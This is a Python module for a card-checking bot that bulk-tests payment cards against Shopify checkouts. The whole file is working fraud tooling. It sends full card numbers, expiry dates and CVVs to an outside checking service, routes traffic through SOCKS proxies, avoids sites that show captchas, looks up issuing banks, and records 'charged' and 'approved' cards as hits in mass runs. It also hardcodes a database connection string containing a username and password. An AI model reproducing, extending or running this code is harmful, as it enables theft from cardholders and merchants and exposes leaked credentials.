import asyncio
import aiohttp
import aiohttp_socks
import time
import json
import random
import string
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from pymongo import MongoClient
from collections import defaultdict
import re

# MongoDB Setup
MONGO_URI = "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "fn_bot"
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
user_sites_col = db["user_sites"]
mass_checks_col = db["mass_checks"]
sites_txt_col = db["sites_txt"]

@dataclass
class Gate4Result:
    status: str
    response: str
    price: str
    gateway: str
    card: str
    card_info: str = ""
    issuer: str = ""
    country: str = ""
    flag: str = ""
    currency: str = ""
    elapsed_time: float = 0.0
    proxy_status: str = ""
    site_used: str = ""
    message: str = ""
    bank: str = ""
    brand: str = ""
    type: str = ""
    level: str = ""

class Gate4Manager:
    def __init__(self):
        self.session = None
        self.user_locks = defaultdict(asyncio.Lock)
        self.user_check_data = {}
        self.bad_sites = set()
        self.captcha_sites = {}
        self.sites_cache = []
        self.global_sites = []
        self.last_site_load = 0
        self.site_load_interval = 300
        self.load_global_sites()
        
    async def get_session(self):
        if self.session is None or self.session.closed:
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(timeout=timeout)
        return self.session
    
    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
    
    def load_global_sites(self):
        """Load sites from sites.txt file"""
        try:
            if os.path.exists("sites.txt"):
                with open("sites.txt", "r", encoding='utf-8') as f:
                    sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    self.global_sites = sites
                    self.sites_cache = [site for site in sites if site not in self.bad_sites]
                    self.last_site_load = time.time()
            else:
                with open("sites.txt", "w") as f:
                    f.write("# Add your Shopify sites here\n")
                    f.write("https://scorenn.com\n")
                self.global_sites = ["https://scorenn.com"]
                self.sites_cache = ["https://scorenn.com"]
        except Exception as e:
            self.global_sites = ["https://scorenn.com"]
            self.sites_cache = ["https://scorenn.com"]
    
    def reload_sites_cache(self):
        """Reload sites cache excluding bad sites and sites with recent captcha"""
        current_time = time.time()
        sites_to_remove = []
        for site, captcha_time in self.captcha_sites.items():
            if current_time - captcha_time > 86400:
                sites_to_remove.append(site)
        
        for site in sites_to_remove:
            del self.captcha_sites[site]
        
        self.sites_cache = [
            site for site in self.global_sites 
            if site not in self.bad_sites and site not in self.captcha_sites
        ]
        self.last_site_load = time.time()
    
    async def get_site_for_user(self, user_id: int) -> str:
        """Get site for user - first check user's sites, then global sites.txt"""
        user_sites = list(user_sites_col.find({"user_id": user_id, "active": True}))
        user_sites_list = [site["site"] for site in user_sites]
        
        if user_sites_list:
            user_sites_list = [
                site for site in user_sites_list 
                if site not in self.bad_sites and site not in self.captcha_sites
            ]
            if user_sites_list:
                return random.choice(user_sites_list)
        
        current_time = time.time()
        if not self.sites_cache or (current_time - self.last_site_load) > self.site_load_interval:
            self.reload_sites_cache()
        
        if self.sites_cache:
            return random.choice(self.sites_cache)
        
        return "https://scorenn.com"
    
    async def check_site(self, site: str) -> Tuple[bool, str]:
        """Check if a site works with the API"""
        try:
            test_card = "4242424242424242|01|29|123"
            result = await self.check_card(test_card, site, test_mode=True)
            
            if result.status == "Error" or "HCAPTCHA" in result.response.upper():
                return False, result.message
            return True, "Site is working"
        except Exception as e:
            return False, str(e)
    
    async def perform_bin_lookup(self, cc: str, proxy: str = None) -> Dict[str, Any]:
        """Perform BIN lookup for card details"""
        start_time = time.time()
        
        try:
            cc_clean = cc.replace(" ", "").split('|')[0][:6]
            
            connector = None
            if proxy:
                try:
                    if '://' in proxy:
                        proxy = proxy.split('://')[-1]
                    
                    if ':' in proxy:
                        parts = proxy.split(':')
                        if len(parts) == 2:
                            host, port = parts[0], int(parts[1])
                            connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{host}:{port}')
                        elif len(parts) == 4:
                            username, password, host, port = parts
                            connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{username}:{password}@{host}:{port}')
                        else:
                            host_port_match = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', proxy)
                            if host_port_match:
                                host, port = host_port_match.groups()
                                connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{host}:{port}')
                except:
                    pass
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{cc_clean}', timeout=15) as response:
                    if response.status != 200:
                        return {"success": False, "message": "BIN Lookup failed", "elapsed_time": time.time() - start_time}
                    
                    data = await response.json()
                    return {
                        "success": True,
                        "bin": data.get('bin', ''),
                        "bank": data.get('bank', ''),
                        "brand": data.get('brand', ''),
                        "type": data.get('type', ''),
                        "level": data.get('level', ''),
                        "country": data.get('country_name', ''),
                        "flag": data.get('country_flag', '🏳️'),
                        "currency": data.get('country_currencies', ['USD'])[0] if data.get('country_currencies') else "USD",
                        "elapsed_time": time.time() - start_time
                    }
                    
        except asyncio.TimeoutError:
            return {"success": False, "message": "BIN Lookup timed out", "elapsed_time": time.time() - start_time}
        except:
            return {"success": False, "message": "BIN Lookup error", "elapsed_time": time.time() - start_time}
    
    def format_proxy_display(self, proxy: str) -> str:
        """Format proxy for display (hide sensitive info)"""
        if not proxy or proxy == "No Proxy":
            return "No Proxy"
        
        try:
            if '://' in proxy:
                proxy = proxy.split('://')[-1]
            
            if '@' in proxy:
                auth, server = proxy.split('@', 1)
                if ':' in server:
                    host, port = server.split(':', 1)
                    if len(host) > 6:
                        host_display = f"{host[:3]}...{host[-3:]}"
                    else:
                        host_display = "***"
                    return f"***@{host_display}:{port}"
                else:
                    return "***@***"
            else:
                if ':' in proxy:
                    host, port = proxy.split(':', 1)
                    if len(host) > 6:
                        host_display = f"{host[:3]}...{host[-3:]}"
                    else:
                        host_display = "***"
                    return f"{host_display}:{port}"
                else:
                    return "***"
        except:
            return "Proxy"
    
    def format_site_display(self, site: str) -> str:
        """Format site for display (hide long URLs)"""
        if not site:
            return "Unknown"
        
        try:
            if site.startswith('http://'):
                site = site[7:]
            elif site.startswith('https://'):
                site = site[8:]
            
            if site.startswith('www.'):
                site = site[4:]
            
            domain = site.split('/')[0]
            
            if len(domain) > 20:
                return f"{domain[:17]}..."
            return domain
        except:
            return "Site"
    
    async def check_card(self, card: str, site: str = None, proxy: str = None, test_mode: bool = False) -> Gate4Result:
        """Check a single card using the API"""
        start_time = time.time()
        
        try:
            if not site:
                site = "https://scorenn.com"
            
            card = card.strip()
            
            if proxy:
                api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}&proxy={proxy}"
            else:
                api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}"
            
            session = await self.get_session()
            async with session.get(api_url, timeout=30) as response:
                response_text = await response.text()
                
                if response.status != 200:
                    return Gate4Result(
                        status="Error",
                        response="API Error",
                        price="0.00",
                        gateway="Unknown",
                        card=card,
                        elapsed_time=time.time() - start_time,
                        proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                        site_used=site,
                        message=f"API returned status {response.status}"
                    )
                
                try:
                    data = json.loads(response_text)
                    response_msg = data.get("Response", "").upper()
                    
                    if "HCAPTCHA" in response_msg or "CAPTCHA" in response_msg:
                        self.captcha_sites[site] = time.time()
                        return Gate4Result(
                            status="Captcha",
                            response=data.get("Response", "HCAPTCHA DETECTED"),
                            price="0.00",
                            gateway="Unknown",
                            card=card,
                            elapsed_time=time.time() - start_time,
                            proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                            site_used=site,
                            message="HCAPTCHA DETECTED"
                        )
                    
                    if any(keyword in response_msg for keyword in ["Thank", "Thank You"]):
                        status = "Charged"
                    elif "ACTIONREQUIRED" in response_msg or "ActionRequired" in response_msg or "APPROVED" in response_msg:
                        status = "Approved"
                    elif "CARD_DECLINED" in response_msg or "DECLINED" in response_msg:
                        status = "Declined"
                    elif data.get("Status", "").lower() == "true":
                        status = "Approved"
                    else:
                        status = "Declined"
                    
                    bin_data = {}
                    if not test_mode:
                        bin_data = await self.perform_bin_lookup(card, proxy)
                    
                    card_parts = card.split('|')
                    if len(card_parts) >= 4:
                        card_num = card_parts[0]
                        card_info = f"{card_num[:6]}******{card_num[-4:]} | {card_parts[1]}/{card_parts[2]}"
                    else:
                        card_info = card
                    
                    result = Gate4Result(
                        status=status,
                        response=data.get("Response", "Unknown"),
                        price=data.get("Price", "0.00"),
                        gateway=data.get("Gateway", "Unknown"),
                        card=card,
                        card_info=card_info,
                        issuer=bin_data.get("bank", "") if bin_data.get("success") else "",
                        country=bin_data.get("country", "") if bin_data.get("success") else "",
                        flag=bin_data.get("flag", "🏳️") if bin_data.get("success") else "🏳️",
                        currency=bin_data.get("currency", "USD") if bin_data.get("success") else "USD",
                        elapsed_time=time.time() - start_time,
                        proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                        site_used=site,
                        message=data.get("Response", "")
                    )
                    
                    if bin_data.get("success"):
                        result.bank = bin_data.get("bank", "")
                        result.brand = bin_data.get("brand", "")
                        result.type = bin_data.get("type", "")
                        result.level = bin_data.get("level", "")
                    
                    return result
                    
                except json.JSONDecodeError:
                    response_upper = response_text.upper()
                    if "HCAPTCHA" in response_upper or "CAPTCHA" in response_upper:
                        self.captcha_sites[site] = time.time()
                        return Gate4Result(
                            status="Captcha",
                            response="HCAPTCHA DETECTED",
                            price="0.00",
                            gateway="Unknown",
                            card=card,
                            elapsed_time=time.time() - start_time,
                            proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                            site_used=site,
                            message="HCAPTCHA DETECTED"
                        )
                    
                    if "THANK" in response_upper or "SUCCESS" in response_upper:
                        status = "Charged"
                    elif "DECLINED" in response_upper:
                        status = "Declined"
                    else:
                        status = "Error"
                    
                    return Gate4Result(
                        status=status,
                        response=response_text[:100],
                        price="0.00",
                        gateway="Unknown",
                        card=card,
                        elapsed_time=time.time() - start_time,
                        proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                        site_used=site,
                        message=f"Invalid JSON: {response_text[:100]}"
                    )
                    
        except asyncio.TimeoutError:
            return Gate4Result(
                status="Error",
                response="Timeout",
                price="0.00",
                gateway="Unknown",
                card=card,
                elapsed_time=time.time() - start_time,
                proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                site_used=site,
                message="Request timeout"
            )
        except Exception as e:
            return Gate4Result(
                status="Error",
                response="Exception",
                price="0.00",
                gateway="Unknown",
                card=card,
                elapsed_time=time.time() - start_time,
                proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                site_used=site,
                message=str(e)
            )
    
    def mark_site_bad(self, site: str):
        """Mark a site as bad (not working)"""
        self.bad_sites.add(site)
        user_sites_col.update_many(
            {"site": site},
            {"$set": {"active": False, "marked_bad_at": datetime.utcnow()}}
        )
        if site in self.sites_cache:
            self.sites_cache.remove(site)
    
    def add_user_check(self, user_id: int, total_cards: int):
        """Add a new mass check for user"""
        check_id = f"{user_id}_{int(time.time())}"
        self.user_check_data[user_id] = {
            "check_id": check_id,
            "start_time": time.time(),
            "total": total_cards,
            "checked": 0,
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "hits": [],
            "declined_list": [],
            "current_response": "Waiting...",
            "stop": False,
            "last_update": time.time()
        }
        return check_id
    
    def update_user_check(self, user_id: int, result: Gate4Result):
        """Update user check stats"""
        if user_id not in self.user_check_data:
            return
        
        data = self.user_check_data[user_id]
        data["checked"] += 1
        data["last_update"] = time.time()
        data["current_response"] = result.response[:30] + "..." if len(result.response) > 30 else result.response
        
        if result.status == "Charged":
            data["charged"] += 1
            data["hits"].append((result.card, "Charged", result.response))
        elif result.status == "Approved":
            data["approved"] += 1
            data["hits"].append((result.card, "Approved", result.response))
        elif result.status == "Declined":
            data["declined"] += 1
            data["declined_list"].append(result.card)
        elif result.status == "Error" or result.status == "Captcha":
            data["errors"] += 1
    
    def stop_user_check(self, user_id: int) -> bool:
        """Stop a user's mass check"""
        if user_id in self.user_check_data:
            self.user_check_data[user_id]["stop"] = True
            return True
        return False
    
    def get_user_check_data(self, user_id: int):
        """Get user's current check data"""
        return self.user_check_data.get(user_id)
    
    def remove_user_check(self, user_id: int):
        """Remove user check data"""
        if user_id in self.user_check_data:
            del self.user_check_data[user_id]
    
    def add_mass_sites(self, sites: List[str]):
        """Add multiple sites to global list"""
        try:
            existing_sites = set()
            if os.path.exists("sites.txt"):
                with open("sites.txt", "r", encoding='utf-8') as f:
                    existing_sites = set(line.strip() for line in f if line.strip() and not line.startswith('#'))
            
            added_count = 0
            with open("sites.txt", "a", encoding='utf-8') as f:
                for site in sites:
                    site = site.strip()
                    if site and site not in existing_sites:
                        f.write(f"{site}\n")
                        existing_sites.add(site)
                        added_count += 1
            
            self.load_global_sites()
            return added_count, len(existing_sites)
            
        except:
            return 0, 0

# Global gate4 manager
gate4_manager = Gate4Manager()
